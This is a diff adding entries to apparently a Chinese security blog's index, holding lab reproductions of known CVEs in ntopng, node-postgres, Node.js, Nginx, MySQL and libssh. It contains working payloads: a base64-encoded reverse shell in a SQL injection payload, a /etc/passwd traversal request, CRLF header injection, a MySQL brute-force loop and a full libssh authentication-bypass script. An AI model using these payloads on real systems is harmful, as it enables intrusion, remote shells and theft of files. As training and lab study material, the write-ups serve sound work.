@@ -17,6 +17,386 @@
       </tags>
   </entry>
   <entry>
+    <title>ntopng 身份验证绕过 (CVE-2021-28073)</title>
+    <url>/2021/11/11/ntopng%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%20(CVE-2021-28073)/</url>
+    <content><![CDATA[<h1 id="ntopng-身份验证绕过-CVE-2021-28073"><a href="#ntopng-身份验证绕过-CVE-2021-28073" class="headerlink" title="ntopng 身份验证绕过 (CVE-2021-28073)"></a>ntopng 身份验证绕过 (CVE-2021-28073)</h1><p>Ntopng 是一个被动的网络监控工具，专注于可以从服务器捕获的流量中获取的流量和统计信息。</p>
+<p>ntopng 4.2 及之前的版本中存在身份验证绕过漏洞。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="http://noahblog.360.cn/ntopng-multiple-vulnerabilities/" target="_blank" rel="noopener">http://noahblog.360.cn/ntopng-multiple-vulnerabilities/</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>根据参考链接和简单的<a href="https://github.com/vulhub/vulhub/blob/master/ntopng/CVE-2021-28073/poc.py" target="_blank" rel="noopener">poc.py</a>，计算出 ntopng lua 目录的长度：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 poc.py --url http:&#x2F;&#x2F;192.168.44.132:3000&#x2F; baselength</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211115/16369541307004.png" alt="image-20211115132530216"></p>
+<p>可以看出，Vulhub容器中的路径长度为36。</p>
+<p>然后，浏览我们想要未经授权访问的页面或界面，如<code>/lua/find_prefs.lua</code>，会被重定向到登录页面。</p>
+<p>使用 POC 生成未授权访问 URL：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 poc.py --url http:&#x2F;&#x2F;192.168.44.132:3000&#x2F; generate -l 36 -p find_prefs.lua</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211115/16369541325467.png" alt="image-20211115132621980"></p>
+<p>该接口可以通过这个 URL 未经授权访问：</p>
+<p><img src="https://image.3001.net/images/20211115/16369541352389.png" alt="image-20211115132719867"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>ntopng</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>node-postgres 代码执行漏洞（CVE-2017-16082）</title>
+    <url>/2021/11/11/node-postgres%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-16082%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="node-postgres-代码执行漏洞（CVE-2017-16082）"><a href="#node-postgres-代码执行漏洞（CVE-2017-16082）" class="headerlink" title="node-postgres 代码执行漏洞（CVE-2017-16082）"></a>node-postgres 代码执行漏洞（CVE-2017-16082）</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>node-postgres在处理类型为<code>Row Description</code>的postgres返回包时，将字段名拼接到代码中。由于没有进行合理转义，导致一个特殊构造的字段名可逃逸出代码单引号限制，造成代码执行漏洞。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html</a></li>
+<li><a href="https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability" target="_blank" rel="noopener">https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/28575189" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28575189</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>成功运行后，访问<code>http://192.168.44.132:3000/?id=1</code>即可查看到id为1的用户信息，用sqlmap即可发现此处存在注入点，且数据库为postgres：</p>
+<p><img src="https://image.3001.net/images/20211115/16369532616760.png" alt="image-20211115105554296"></p>
+<p>那么，我们就可以猜测这里存在node-postgres的代码执行漏洞。编写我想执行的命令<code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ0LjEzMi80NDQ0IDA+JjE=|base64 -d|bash</code>，然后适当分割（每段长度不超过64字符）后替换在如下payload中：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT 1 AS &quot;\&#39;]&#x3D;0;require&#x3D;process.mainModule.constructor._load;&#x2F;*&quot;, 2 AS &quot;*&#x2F;p&#x3D;require(&#96;child_process&#96;);&#x2F;*&quot;, 3 AS &quot;*&#x2F;p.exec(&#96;echo YmFzaCAtaSA+JiAvZGV2L3Rj&#96;+&#x2F;*&quot;, 4 AS &quot;*&#x2F;&#96;cC8xOTIuMTY4LjQ0LjEzMi80NDQ0IDA+JjE&#x3D;|base64 -d|bash&#96;)&#x2F;&#x2F;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>将上述payload编码后发送：</p>
+<p><img src="https://image.3001.net/images/20211115/1636953265510.png" alt="image-20211115111942676"></p>
+<p>成功执行命令，如反弹shell：</p>
+<p><img src="https://image.3001.net/images/20211115/1636953267724.png" alt="image-20211115112011905"></p>
+<p>因为复现过程中坑比较多，payload生成与测试过程中如果出现错误，还请多多阅读<a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html" target="_blank" rel="noopener">这篇文章</a>，从原理上找到问题所在。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Node.js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Node.js 目录穿越漏洞（CVE-2017-14849）</title>
+    <url>/2021/11/11/Node.js%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-14849%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Node-js-目录穿越漏洞（CVE-2017-14849）"><a href="#Node-js-目录穿越漏洞（CVE-2017-14849）" class="headerlink" title="Node.js 目录穿越漏洞（CVE-2017-14849）"></a>Node.js 目录穿越漏洞（CVE-2017-14849）</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>参考文档：</p>
+<ul>
+<li><a href="https://nodejs.org/en/blog/vulnerability/september-2017-path-validation/" target="_blank" rel="noopener">https://nodejs.org/en/blog/vulnerability/september-2017-path-validation/</a></li>
+<li><a href="https://security.tencent.com/index.php/blog/msg/121" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/121</a></li>
+</ul>
+<p>原因是 Node.js 8.5.0 对目录进行<code>normalize</code>操作时出现了逻辑错误，导致向上层跳跃的时候（如<code>../../../../../../etc/passwd</code>），在中间位置增加<code>foo/../</code>（如<code>../../../foo/../../../../etc/passwd</code>），即可使<code>normalize</code>返回<code>/etc/passwd</code>，但实际上正确结果应该是<code>../../../../../../etc/passwd</code>。</p>
+<p>express这类web框架，通常会提供了静态文件服务器的功能，这些功能依赖于<code>normalize</code>函数。比如，express在判断path是否超出静态目录范围时，就用到了<code>normalize</code>函数，上述BUG导致<code>normalize</code>函数返回错误结果导致绕过了检查，造成任意文件读取漏洞。</p>
+<p>当然，<code>normalize</code>的BUG可以影响的绝非仅有express，更有待深入挖掘。不过因为这个BUG是node 8.5.0 中引入的，在 8.6 中就进行了修复，所以影响范围有限。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.44.132:3000/</code>即可查看到一个web页面，其中引用到了文件<code>/static/main.js</code>，说明其存在静态文件服务器。</p>
+<p>发送如下数据包，即可读取passwd：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;static&#x2F;..&#x2F;..&#x2F;..&#x2F;a&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:3000</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;95.0.4638.69 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211115/16369531391026.png" alt="image-20211115093900701"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Node.js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nginx 解析漏洞复现</title>
+    <url>/2021/11/10/Nginx%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a>Nginx 解析漏洞复现</h1><p>Nginx解析漏洞复现。</p>
+<p>版本信息：</p>
+<ul>
+<li>Nginx 1.x 最新版</li>
+<li>PHP 7.x最新版</li>
+</ul>
+<p>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.44.132/uploadfiles/nginx.png</code>和<code>http://192.168.44.132/uploadfiles/nginx.png/.php</code>即可查看效果。</p>
+<p>正常显示：</p>
+<p><img src="https://image.3001.net/images/20211115/16369397104182.png" alt="image-20211102172712643"></p>
+<p>增加<code>/.php</code>后缀，被解析成PHP文件：</p>
+<p><img src="https://image.3001.net/images/20211115/16369397133381.png" alt="image-20211102172730917"></p>
+<p>访问<code>http://192.168.44.132/index.php</code>可以测试上传功能，上传图片马并不能解析存在漏洞，但利用解析漏洞即可getshell：</p>
+<p><img src="https://image.3001.net/images/20211115/16369397162874.png" alt="image-20211102173824316"></p>
+<p>成功利用解析漏洞执行代码</p>
+<p><img src="https://image.3001.net/images/20211115/16369397197418.png" alt="image-20211102173923401"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Nginx</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nginx 配置错误导致漏洞</title>
+    <url>/2021/11/10/Nginx%20%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Nginx-配置错误导致漏洞"><a href="#Nginx-配置错误导致漏洞" class="headerlink" title="Nginx 配置错误导致漏洞"></a>Nginx 配置错误导致漏洞</h1><p>运行成功后，Nginx将会监听8080/8081/8082三个端口，分别对应三种漏洞。</p>
+<a id="more"></a>
+
+<h2 id="Mistake-1-CRLF注入漏洞"><a href="#Mistake-1-CRLF注入漏洞" class="headerlink" title="Mistake 1. CRLF注入漏洞"></a>Mistake 1. CRLF注入漏洞</h2><p>Nginx会将<code>$uri</code>进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。</p>
+<p>错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">    return 302 https:&#x2F;&#x2F;$host$uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Payload: <code>http://192.168.44.132:8080/%0a%0dSet-Cookie:%20a=1</code>，可注入Set-Cookie头。</p>
+<p><img src="https://image.3001.net/images/20211115/16369396511467.png" alt="image-20211102151604040"></p>
+<p>利用《<a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">Bottle HTTP 头注入漏洞探究</a>》中的技巧，即可构造一个XSS漏洞：</p>
+<p><img src="https://image.3001.net/images/20211115/16369396533629.png" alt="image-20211102154940189"></p>
+<h2 id="Mistake-2-目录穿越漏洞"><a href="#Mistake-2-目录穿越漏洞" class="headerlink" title="Mistake 2. 目录穿越漏洞"></a>Mistake 2. 目录穿越漏洞</h2><p>Nginx在配置别名（Alias）的时候，如果忘记加<code>/</code>，将造成一个目录穿越漏洞。</p>
+<p>错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;files &#123;</span><br><span class="line">    alias &#x2F;home&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Payload: <code>http://your-ip:8081/files../</code> ，成功穿越到根目录：</p>
+<p><img src="https://image.3001.net/images/20211115/16369396567510.png" alt="image-20211102160014979"></p>
+<h2 id="Mistake-3-add-header被覆盖"><a href="#Mistake-3-add-header被覆盖" class="headerlink" title="Mistake 3. add_header被覆盖"></a>Mistake 3. add_header被覆盖</h2><p>Nginx配置文件子块（server、location、if）中的<code>add_header</code>，将会覆盖父块中的<code>add_header</code>添加的HTTP头，造成一些安全隐患。</p>
+<p>如下列代码，整站（父块中）添加了CSP头：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;;</span><br><span class="line">add_header X-Frame-Options DENY;</span><br><span class="line"></span><br><span class="line">location &#x3D; &#x2F;test1 &#123;</span><br><span class="line">    rewrite ^(.*)$ &#x2F;xss.html break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x3D; &#x2F;test2 &#123;</span><br><span class="line">    add_header X-Content-Type-Options nosniff;</span><br><span class="line">    rewrite ^(.*)$ &#x2F;xss.html break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看/test1的响应回显</p>
+<p><img src="https://image.3001.net/images/20211115/16369396597145.png" alt="image-20211102161924226"></p>
+<p>但<code>/test2</code>的location中又添加了<code>X-Content-Type-Options</code>头，导致父块中的<code>add_header</code>全部失效：</p>
+<p><img src="https://image.3001.net/images/20211115/16369396626880.png" alt="image-20211102162044429"></p>
+<p>XSS可被触发：</p>
+<p><img src="https://image.3001.net/images/20211115/16369396647116.png" alt="image-20211102165522990"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Nginx</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nginx越界读取缓存漏洞（CVE-2017-7529）</title>
+    <url>/2021/11/10/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7529%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Nginx越界读取缓存漏洞（CVE-2017-7529）"><a href="#Nginx越界读取缓存漏洞（CVE-2017-7529）" class="headerlink" title="Nginx越界读取缓存漏洞（CVE-2017-7529）"></a>Nginx越界读取缓存漏洞（CVE-2017-7529）</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>参考阅读：</p>
+<ul>
+<li><a href="https://cert.360.cn/detailnews.html?id=b879782fbad4a7f773b6c18490d67ac7" target="_blank" rel="noopener">https://cert.360.cn/detailnews.html?id=b879782fbad4a7f773b6c18490d67ac7</a></li>
+<li><a href="http://galaxylab.org/cve-2017-7529-nginx整数溢出漏洞分析/" target="_blank" rel="noopener">http://galaxylab.org/cve-2017-7529-nginx%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
+</ul>
+<a id="more"></a>
+
+<p>Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。</p>
+<p>如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.44.132:8080/</code>，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。</p>
+<p>调用<code>python3 poc.py http://192.168.44.132:8080/</code>，读取返回结果：</p>
+<p><img src="https://image.3001.net/images/20211115/16369395896428.png" alt="image-20211101151401342"></p>
+<p>可见，越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。</p>
+<p>如果读取有误，请调整poc.py中的偏移地址（605）。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Nginx</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Nginx 文件名逻辑漏洞（CVE-2013-4547）</title>
+    <url>/2021/11/10/Nginx%20%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2013-4547%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h1><p>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547</a></li>
+<li><a href="https://blog.werner.wiki/file-resolution-vulnerability-nginx/" target="_blank" rel="noopener">https://blog.werner.wiki/file-resolution-vulnerability-nginx/</a></li>
+<li><a href="http://www.91ri.org/9064.html" target="_blank" rel="noopener">http://www.91ri.org/9064.html</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。</p>
+<p>举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line"></span><br><span class="line">    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  &#x2F;var&#x2F;www&#x2F;html$fastcgi_script_name;</span><br><span class="line">    fastcgi_param  DOCUMENT_ROOT &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。</p>
+<p>而存在CVE-2013-4547的情况下，我们请求<code>1.gif[0x20][0x00].php</code>，这个URI可以匹配上正则<code>\.php$</code>，可以进入这个Location块；但进入后，Nginx却错误地认为请求的文件是<code>1.gif[0x20]</code>，就设置其为<code>SCRIPT_FILENAME</code>的值发送给fastcgi。</p>
+<p>fastcgi根据<code>SCRIPT_FILENAME</code>的值进行解析，最后造成了解析漏洞。</p>
+<p>所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。</p>
+<p>再举个例子，比如很多网站限制了允许访问后台的IP：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F;admin&#x2F; &#123;</span><br><span class="line">    allow 127.0.0.1;</span><br><span class="line">    deny all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以请求如下URI：<code>/test[0x20]/../admin/index.php</code>，这个URI不会匹配上location后面的<code>/admin/</code>，也就绕过了其中的IP验证；但最后请求的是<code>/test[0x20]/../admin/index.php</code>文件，也就是<code>/admin/index.php</code>，成功访问到后台。（这个前提是需要有一个目录叫“test ”：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制）</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080/</code>即可看到一个上传页面。</p>
+<p>这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用CVE-2013-4547。我们上传一个“1.gif ”，注意后面的空格：<img src="https://image.3001.net/images/20211115/1636938491844.png" alt="image-20211028172220635"></p>
+<p>访问<code>http://192.168.44.132:8080/uploadfiles/1.gif[0x20][0x00].php</code>，即可发现PHP已被解析：</p>
+<p><img src="https://image.3001.net/images/20211115/1636938494144.png" alt="image-20211028172315687"></p>
+<p>注意，[0x20]是空格，[0x00]是<code>\0</code>，这两个字符都不需要编码。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Nginx</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mysql 身份认证绕过漏洞（CVE-2012-2122）</title>
+    <url>/2021/11/01/Mysql%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2012-2122%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="Mysql-身份认证绕过漏洞（CVE-2012-2122）"><a href="#Mysql-身份认证绕过漏洞（CVE-2012-2122）" class="headerlink" title="Mysql 身份认证绕过漏洞（CVE-2012-2122）"></a>Mysql 身份认证绕过漏洞（CVE-2012-2122）</h1><p>当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p>
+<p>受影响版本：</p>
+<ul>
+<li>来自 5.1.62、5.2.12、5.3.6、5.5.23 的 MariaDB 版本不是。</li>
+<li>5.1.63、5.5.24、5.6.6 的 MySQL 版本不是。</li>
+</ul>
+<p>参考链接：</p>
+<ul>
+<li><a href="http://www.freebuf.com/vuls/3815.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/3815.html</a></li>
+<li><a href="https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/" target="_blank" rel="noopener">https://blog.rapid7.com/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，将启动一个Mysql服务（版本：5.5.23），监听3306端口，通过正常的Mysql客户端，可以直接登录的，正确root密码是123456。</p>
+<p>在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 1000`; <span class="keyword">do</span> mysql -uroot -pwrong -h 192.168.44.132 -P3306 ; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211101/1635749540696.png" alt="image-20210830172945607"></p>
+<p>更多测试和利用方法，见参考链接。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>libssh 身份验证绕过漏洞(CVE-2018-10933)</title>
+    <url>/2021/11/01/libssh%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2018-10933)/</url>
+    <content><![CDATA[<h1 id="libssh-身份验证绕过漏洞-CVE-2018-10933"><a href="#libssh-身份验证绕过漏洞-CVE-2018-10933" class="headerlink" title="libssh 身份验证绕过漏洞(CVE-2018-10933)"></a>libssh 身份验证绕过漏洞(CVE-2018-10933)</h1><p>libssh 是一个在客户端和服务器端实现 SSHv2 协议的多平台 C 库。在 libssh 的服务器端状态机中发现了一个逻辑漏洞。攻击者可以<code>MSG_USERAUTH_SUCCESS</code>在认证成功之前发送消息。这可以绕过身份验证并访问目标 SSH 服务器。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://www.libssh.org/security/advisories/CVE-2018-10933.txt" target="_blank" rel="noopener">https://www.libssh.org/security/advisories/CVE-2018-10933.txt</a></li>
+<li><a href="https://www.seebug.org/vuldb/ssvid-97614" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97614</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，我们可以连接<code>192.168.44.132:2222</code>端口（账号密码<code>myuser:mypassword</code>），就是合法的ssh登录：</p>
+<p><img src="https://image.3001.net/images/20211101/16357493957987.png" alt="image-20211028155658851"></p>
+<p>参考<a href="https://www.seebug.org/vuldb/ssvid-97614" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97614 中</a>给出的 POC ，我们可以使用以下脚本来证明漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import sys</span><br><span class="line">import paramiko</span><br><span class="line">import socket</span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream&#x3D;sys.stdout, level&#x3D;logging.DEBUG)</span><br><span class="line">bufsize &#x3D; 2048</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def execute(hostname, port, command):</span><br><span class="line">    sock &#x3D; socket.socket()</span><br><span class="line">    try:</span><br><span class="line">        sock.connect((hostname, int(port)))</span><br><span class="line"></span><br><span class="line">        message &#x3D; paramiko.message.Message()</span><br><span class="line">        transport &#x3D; paramiko.transport.Transport(sock)</span><br><span class="line">        transport.start_client()</span><br><span class="line"></span><br><span class="line">        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)</span><br><span class="line">        transport._send_message(message)</span><br><span class="line"></span><br><span class="line">        client &#x3D; transport.open_session(timeout&#x3D;10)</span><br><span class="line">        client.exec_command(command)</span><br><span class="line"></span><br><span class="line">        # stdin &#x3D; client.makefile(&quot;wb&quot;, bufsize)</span><br><span class="line">        stdout &#x3D; client.makefile(&quot;rb&quot;, bufsize)</span><br><span class="line">        stderr &#x3D; client.makefile_stderr(&quot;rb&quot;, bufsize)</span><br><span class="line"></span><br><span class="line">        output &#x3D; stdout.read()</span><br><span class="line">        error &#x3D; stderr.read()</span><br><span class="line"></span><br><span class="line">        stdout.close()</span><br><span class="line">        stderr.close()</span><br><span class="line"></span><br><span class="line">        return (output+error).decode()</span><br><span class="line">    except paramiko.SSHException as e:</span><br><span class="line">        logging.exception(e)</span><br><span class="line">        logging.debug(&quot;TCPForwarding disabled on remote server can&#39;t connect. Not Vulnerable&quot;)</span><br><span class="line">    except socket.error:</span><br><span class="line">        logging.debug(&quot;Unable to connect.&quot;)</span><br><span class="line"></span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))</span><br></pre></td></tr></table></figure>
+
+<p>可以在目标服务器上执行任意命令，如下所示：</p>
+<p><img src="https://image.3001.net/images/20211101/16357494147459.png" alt="image-20211028160645612"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>libssh</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）</title>
+    <url>/2021/11/01/Laravel%20Ignition%202.5.1%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-3129%EF%BC%89/</url>
